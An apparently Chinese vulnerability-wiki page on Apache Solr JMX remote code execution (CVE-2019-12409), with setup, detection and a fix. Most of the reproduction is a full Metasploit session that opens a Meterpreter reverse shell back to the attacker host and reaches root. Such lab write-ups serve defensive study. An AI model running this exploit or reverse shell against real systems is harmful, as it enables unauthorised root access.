
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>Web服务器漏洞 · GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="../Web应用漏洞/1039家校通 万能密码绕过 CNVD-2020-31494.html" />
    
    
    <link rel="prev" href="../CMS漏洞/BSPHP 未授权访问 信息泄露漏洞.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../../">
            
                <a href="../../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../操作系统漏洞/">
            
                <a href="../操作系统漏洞/">
            
                    
                    操作系统漏洞
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1" data-path="../操作系统漏洞/Linux kernel权限提升漏洞 CVE-2021-3493.html">
            
                <a href="../操作系统漏洞/Linux kernel权限提升漏洞 CVE-2021-3493.html">
            
                    
                    Linux kernel权限提升漏洞 CVE-2021-3493
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="../服务器应用漏洞/HongKe ntopng 流量分析系统 权限绕过漏洞 CVE-2021-28073.html">
            
                <a href="../服务器应用漏洞/HongKe ntopng 流量分析系统 权限绕过漏洞 CVE-2021-28073.html">
            
                    
                    服务器应用漏洞
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="../开发框架漏洞/PHPUnit eval-stdin.php 远程命令执行漏洞 CVE-2017-9841.html">
            
                <a href="../开发框架漏洞/PHPUnit eval-stdin.php 远程命令执行漏洞 CVE-2017-9841.html">
            
                    
                    开发框架漏洞
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="../开发语言漏洞/PHP zerodium后门漏洞.html">
            
                <a href="../开发语言漏洞/PHP zerodium后门漏洞.html">
            
                    
                    开发语言漏洞
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.6" data-path="../网络设备漏洞/ACTI 视频监控 任意文件读取漏洞.html">
            
                <a href="../网络设备漏洞/ACTI 视频监控 任意文件读取漏洞.html">
            
                    
                    网络设备漏洞
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7" data-path="../CMS漏洞/BSPHP 未授权访问 信息泄露漏洞.html">
            
                <a href="../CMS漏洞/BSPHP 未授权访问 信息泄露漏洞.html">
            
                    
                    CMS漏洞
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.8" data-path="Apache Solr JMX服务 RCE CVE-2019-12409.html">
            
                <a href="Apache Solr JMX服务 RCE CVE-2019-12409.html">
            
                    
                    Web服务器漏洞
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.9" data-path="../Web应用漏洞/1039家校通 万能密码绕过 CNVD-2020-31494.html">
            
                <a href="../Web应用漏洞/1039家校通 万能密码绕过 CNVD-2020-31494.html">
            
                    
                    Web应用漏洞
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="../.." >Web服务器漏洞</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="apache-solr-jmx&#x670D;&#x52A1;-rce--cve-2019-12409">Apache Solr JMX&#x670D;&#x52A1; RCE  CVE-2019-12409</h1>
<h2 id="&#x6F0F;&#x6D1E;&#x63CF;&#x8FF0;">&#x6F0F;&#x6D1E;&#x63CF;&#x8FF0;</h2>
<p>Java ManagementExtensions&#xFF08;JMX&#xFF09;&#x662F;&#x4E00;&#x79CD;Java&#x6280;&#x672F;&#xFF0C;&#x4E3A;&#x7BA1;&#x7406;&#x548C;&#x76D1;&#x89C6;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x3001;&#x7CFB;&#x7EDF;&#x5BF9;&#x8C61;&#x3001;&#x8BBE;&#x5907;&#xFF08;&#x5982;&#x6253;&#x5370;&#x673A;&#xFF09;&#x548C;&#x9762;&#x5411;&#x670D;&#x52A1;&#x7684;&#x7F51;&#x7EDC;&#x63D0;&#x4F9B;&#x76F8;&#x5E94;&#x7684;&#x5DE5;&#x5177;&#x3002;JMX &#x4F5C;&#x4E3A; Java&#x7684;&#x4E00;&#x79CD;Bean&#x7BA1;&#x7406;&#x673A;&#x5236;&#xFF0C;&#x5982;&#x679C;JMX&#x670D;&#x52A1;&#x7AEF;&#x53E3;&#x66B4;&#x9732;&#xFF0C;&#x90A3;&#x4E48;&#x8FDC;&#x7A0B;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x8BA9;&#x8BE5;&#x670D;&#x52A1;&#x5668;&#x8FDC;&#x7A0B;&#x52A0;&#x8F7D;&#x6076;&#x610F;&#x7684;Bean&#x6587;&#x4EF6;&#xFF0C;&#x968F;&#x7740;Bean&#x7684;&#x6EE5;&#x7528;&#x5BFC;&#x81F4;&#x8FDC;&#x7A0B;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x3002;</p>
<h2 id="&#x5F71;&#x54CD;&#x7248;&#x672C;">&#x5F71;&#x54CD;&#x7248;&#x672C;</h2>
<blockquote>
<p>[!NOTE]</p>
<p>Apache Solr 8.1.1</p>
<p>Apache Solr 8.2.0</p>
</blockquote>
<h2 id="&#x73AF;&#x5883;&#x642D;&#x5EFA;">&#x73AF;&#x5883;&#x642D;&#x5EFA;</h2>
<p><a href="http://archive.apache.org/dist/lucene/solr/8.2.0/solr-8.2.0.zip" target="_blank">&#x4E0B;&#x8F7D; Apache Solr 8.2.0</a></p>
<p>&#x4E5F;&#x53EF;&#x4EE5;docker&#x642D;&#x5EFA;</p>
<pre><code>docker pull solr:8.2.0
docker run --name solr -d -p 8983:8983 -t solr:8.2.0
</code></pre><p>&#x8BBF;&#x95EE; <a href="http://xxx.xxx.xxx.xxx:8983/solr/" target="_blank">http://xxx.xxx.xxx.xxx:8983/solr/</a> &#x6B63;&#x5E38;&#x5373;&#x53EF;</p>
<h2 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;">&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h2>
<p>&#x67E5;&#x770B;&#x642D;&#x5EFA;&#x7684;Solr&#x662F;&#x5426;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;,&#x67E5;&#x770B;solr.in.sh&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x7684;ENABLE_REMOTE_JMX_OPTS&#x9009;&#x9879;&#x8BBE;&#x7F6E;&#x662F;&#x5426;&#x4E3A;&#x201C;Ture&#x201D;&#xFF0C;&#x5982;&#x679C;&#x4E3A;Ture&#xFF0C;&#x5219;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;</p>
<p>&#x67E5;&#x770B;&#x6F0F;&#x6D1E;&#x7AEF;&#x53E3;18983&#x662F;&#x5426;&#x5F00;&#x653E;</p>
<blockquote>
<p>[!NOTE]</p>
<p>nmap xxx.xxx.xxx.xxx -p 18983</p>
</blockquote>
<p><img src="http://wikioss.peiqi.tech/vuln/solr-20.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" alt=""></p>
<pre><code class="lang-shell">root@kali:~/&#x684C;&#x9762;# msfconsole

     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2049 exploits - 1108 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your module, why not try the reload command

msf5 &gt; use exploit/multi/misc/java_jmx_server
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf5 exploit(multi/misc/java_jmx_server) &gt; set rhost 192.168.51.146
rhost =&gt; 192.168.51.146
msf5 exploit(multi/misc/java_jmx_server) &gt; set rport 18983
rport =&gt; 18983
msf5 exploit(multi/misc/java_jmx_server) &gt; set payload java/meterpreter/reverse_tcp
payload =&gt; java/meterpreter/reverse_tcp
msf5 exploit(multi/misc/java_jmx_server) &gt; options

Module options (exploit/multi/misc/java_jmx_server):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   JMXRMI        jmxrmi           yes       The name where the JMX RMI interface is bound
   JMX_PASSWORD                   no        The password to interact with an authenticated JMX endpoint
   JMX_ROLE                       no        The role to interact with an authenticated JMX endpoint
   RHOSTS        192.168.51.146   yes       The target host(s), range CIDR identifier, or hosts file with syntax &apos;file:&lt;path&gt;&apos;
   RPORT         18983            yes       The target port (TCP)
   SRVHOST       0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT       8080             yes       The local port to listen on.
   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                        no        The URI to use for this exploit (default is random)


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.51.149   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Generic (Java Payload)


msf5 exploit(multi/misc/java_jmx_server) &gt; run

[*] Started reverse TCP handler on 192.168.51.149:4444 
[*] 192.168.51.146:18983 - Using URL: http://0.0.0.0:8080/xln8izoCtDUbBVm
[*] 192.168.51.146:18983 - Local IP: http://192.168.51.149:8080/xln8izoCtDUbBVm
[*] 192.168.51.146:18983 - Sending RMI Header...
[*] 192.168.51.146:18983 - Discovering the JMXRMI endpoint...
[+] 192.168.51.146:18983 - JMXRMI endpoint on 127.0.1.1:18983
[*] 192.168.51.146:18983 - Proceeding with handshake...
[+] 192.168.51.146:18983 - Handshake with JMX MBean server on 127.0.1.1:18983
[*] 192.168.51.146:18983 - Loading payload...
[*] 192.168.51.146:18983 - Replied to request for mlet
[*] 192.168.51.146:18983 - Replied to request for payload JAR
[*] 192.168.51.146:18983 - Executing payload...
[*] 192.168.51.146:18983 - Replied to request for payload JAR
[*] Sending stage (53944 bytes) to 192.168.51.146
[*] Meterpreter session 1 opened (192.168.51.149:4444 -&gt; 192.168.51.146:56234) at 2020-11-05 14:17:04 +0800


meterpreter &gt;                                                                 
meterpreter &gt; shell                                                            
Process 1 created.                                                              
Channel 1 created.                                                                
id                                                                                 
&#x7528;&#x6237;id=0(root) &#x7EC4;id=0(root) &#x7EC4;=0(root)
</code></pre>
<p><img src="http://wikioss.peiqi.tech/vuln/solr-21.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10" alt=""></p>
<h3 id="&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;">&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;</h3>
<p>&#x5C06;solr.in.sh&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x7684;ENABLE_REMOTE_JMX_OPTS&#x9009;&#x9879;&#x8BBE;&#x7F6E;&#x4E3A;false&#xFF0C;&#x7136;&#x540E;&#x91CD;&#x542F;Solr&#x670D;&#x52A1;&#x3002;</p>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="../CMS漏洞/BSPHP 未授权访问 信息泄露漏洞.html" class="navigation navigation-prev " aria-label="Previous page: CMS漏洞">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="../Web应用漏洞/1039家校通 万能密码绕过 CNVD-2020-31494.html" class="navigation navigation-next " aria-label="Next page: Web应用漏洞">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Web服务器漏洞","level":"1.8","depth":1,"next":{"title":"Web应用漏洞","level":"1.9","depth":1,"path":"book/Web应用漏洞/1039家校通 万能密码绕过 CNVD-2020-31494.md","ref":"book/Web应用漏洞/1039家校通 万能密码绕过 CNVD-2020-31494.md","articles":[]},"previous":{"title":"CMS漏洞","level":"1.7","depth":1,"path":"book/CMS漏洞/BSPHP 未授权访问 信息泄露漏洞.md","ref":"book/CMS漏洞/BSPHP 未授权访问 信息泄露漏洞.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"book/Web服务器漏洞/Apache Solr JMX服务 RCE CVE-2019-12409.md","mtime":"2021-07-10T17:11:45.883Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-07-10T17:21:07.582Z"},"basePath":"../..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../../gitbook/gitbook.js"></script>
    <script src="../../gitbook/theme.js"></script>
    
        
        <script src="../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

